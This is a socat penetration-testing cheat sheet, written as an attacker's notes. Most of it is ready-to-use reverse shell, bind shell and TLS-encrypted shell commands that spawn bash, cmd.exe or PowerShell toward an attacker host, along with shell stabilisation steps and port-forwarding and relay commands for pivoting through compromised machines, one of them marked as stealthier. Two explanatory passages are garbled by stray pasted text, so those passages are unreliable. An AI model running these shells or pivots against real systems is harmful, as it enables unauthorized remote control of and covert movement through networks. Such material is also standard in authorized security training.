# Socat 

[Socat](https://linux.die.net/man/1/socat) is a command-line utility that establishes two bidirectional byte streams and transfers data between them. For penetration testing, it is similar to Netcat but has additional useful features. 

Socat requires:
1. "-" to transfer data between STDIO and remote host
1. protocol name
1. Any protocols, options, port ARE colon delimited

```bash
socat - TCP4:<remoteIP>:PORT

socat TCP4-LISTEN:8080 STDOUT

socat TCP4:ip:port EXEC:/bin/bash
```

#### Reverse Shells

Start a listener:
```bash
socat TCP-L:<PORT> -                                 # connect regardless with '-'
socat -d -d TCP-LISTEN:8080 STDOUT                   # -d -d = increase verbosity of output#
socat TCP4-LISTEN:8080,fork file:filename.txt,create 
# create specifies that a new file will be created.
# fork creates a child process once connection is made to the listener(multiple connections allowed)
```

Connect to reverse Shell:
```powershell
# Windows!
.\socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
.\socat.exe TCP:<IP>:<Port> EXEC:cmd.exe,pty,stderr,setsid,sigint,sane
```
On Linux
```bash
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
```

#### Bind Shells
Start a bind listener
```bash
socat TCP-L:<PORT> EXEC:"bash -li"
socat TCP-L:<PORT> EXEC:powershell.exe,pipes
```
Connect to target regardless:
```bash
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```

#### Shell stabilisation
```bash
socat TCP-L:<port> FILE:`tty`,raw,echo=0
[CTRL+Z]
stty raw -echo; fg 
```

Fixing terminal size
```bash
stty size
stty -rows 48 -columns 120
```

#### File transfers
```bash
socat TCP4-LISTEN:$PORT,fork file:$filename
```

#### Special upload precompiled socat binary 
```bash
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```
1. pty, allocates a pseudoterminal on the target -- part of the stabation, knowing how to properly use PowerShell to achieve our goals is extremely important. Refer toilisation process
1. stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
1. sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
1. setsid, creates the process in a new session
1. sane, stabilises the terminal, attempting to "normalise" it

Similiarly on Windows:
```batch
.\socat.exe TCP-LISTEN:443,fork EXEC:cmd.exe,pty,stderr,setsid,sigint,sane
```

### Encrypted Shells
 
Generate a Certificate
```bash
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse.key -out thm-reverse.crt

# req indicates that this is a certificate signing request. 
# -x509 specifies that we want an X.509 certificate
# -newkey rsa:4096 creates a new certificate request and a new private key using  RSA, with the key size(Optional sizes!) being 4096 bits. 
# -days 365 shows that the validity of our certificate will be one year
# -subj sets data, such as organization and country, via the command-line.
# -nodes simplifies our command and does not encrypt the private key
# -keyout `PRIVATE\_KEY` specifies the filename where we want toation, knowing how to properly use PowerShell to achieve our goals is extremely important. Refer to save our private key
# -out CERTIFICATE specifies the filename to which we want to write the certificate request
```
Merge the two files:
```bash
cat shell.key shell.crt > shell.pem
```
Setup reverse shell listener 
```bash
# Linux
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 - # verify=0 means dont bother trying to validate cert 
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0,fork EXEC:/bin/bash
```
If on windows:
```powershell
.\socat.exe OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:cmd.exe,pty,std
err,setsid,sigint,sane
```

The same for bind shell
```powershell
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash # For windows after:" ,verify=0 EXEC='cmd.exe' "
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
```
`socat` listener and connection on windows
```bash
socat.exe -d OPENSSL-LISTEN:5678,cert=<cert>, verify=0 STDOUT, bind=127.0.0.1
socat.exe OPENSSL:127.0.0.1:5678, verify=0 EXEC=’cmd.exe
```

#### Less Common Cool Usages
```bash
# Connect to a http server
socat TCP4:domain.com:80 -
# Connect to a https server
socat TCP4:domain.com:443 -

# Output hexdump from a port
socat -x tcp-listen:$port,fork -

# (sleep is necessary to prevent socat closing socket before data received)
(echo -e "GET / HTTP/1.1\r\nHost: butzel.info\r\n\r" && sleep 1) \ | socat TCP4:domain.com:80 -

# http to https 'Proxy' (for an webserver without TLS-Support)
socat OPENSSL-LISTEN:443,reuseaddr,pf=ip4,fork,cert=server.pem,cafile=client.crt,verify=0 TCP4-CONNECT:127.0.0.1:80

# udp to tcp
socat -u udp-recvfrom:1234,fork tcp:localhost:4321

# TOR-forwarding (needs tor-daemon on port 9050 running)
socat tcp4-listen:8080,reuseaddr,fork socks4A:127.0.0.1:t0rhidd3ns3rvice.onion:80,socksport=9050
#https://superuser.com/questions/1302861/how-i-can-make-port-forwarding-using-tor#1302869
```

## Port Redirection and Tunnelling with `socat`

[[Port-Redirection-And-Tunnelling]] with `socat`

Port Forwarding
```bash
# Use to kill and manages jobs
jobs
kill $jobID

# Not stealthy will open a port on a compromised machine!
# Create a listener to port forward traffic from $targetToForwardAddr:$ForwardedPort
socat tcp-l:33060,fork,reuseaddr tcp:$targetToForwardAddr:$ForwardedPort &

# Stealthier
# Create a local port relay on attacking machine
socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
# Reverse port forward from a compormised server back to  
socat tcp:$AttackingMachine:8001 tcp:$targetToForwardAddr:$ForwardedPort,fork &
```

Reverse Shell Relay 
```bash
# RemoteBox - create a listener that connects back to to the address of another box
socat tcp-l:8000 tcp:$LocalBoxAddr:443 &
# LocalBox has listen on port 443
```


## References

[jackadamson](https://jackadamson.github.io/cheatsheets/socat/)
[gothburz](https://github.com/gothburz/OSCP-PWK2.0/blob/master/practical-tools/socat-shell-cheatsheet.md)
[cheat](https://github.com/cheat/cheatsheets/blob/master/socat0)